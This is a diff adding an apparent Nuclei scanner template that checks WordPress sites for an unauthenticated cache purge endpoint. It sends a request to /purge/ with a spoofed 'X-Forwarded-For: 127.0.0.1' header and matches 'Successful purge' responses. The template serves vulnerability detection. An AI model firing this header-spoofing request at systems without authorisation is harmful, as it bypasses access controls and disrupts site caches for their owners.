@@ -1,0 +1,32 @@
+id: wordpress-cache-purge
+info:
+  name: Unauthenticated cache purge 
+  author: osamahamad
+  severity: low
+  description: wordpress-cache-purge
+  tags: wordpress,custom
+  reference:
+    - https://growth.monday.com/purge/
+
+requests:
+  - raw:
+      - |
+        GET /checktterer HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      - |
+        GET /purge/checktterer HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        Accept: */*
+
+    redirects: true
+    max-redirects: 4
+    matchers:
+      - type: word
+        words:
+          - '<title>Successful purge</title>'
+          - '<center><h1>Successful purge</h1>'
+        condition: and
+        part: body
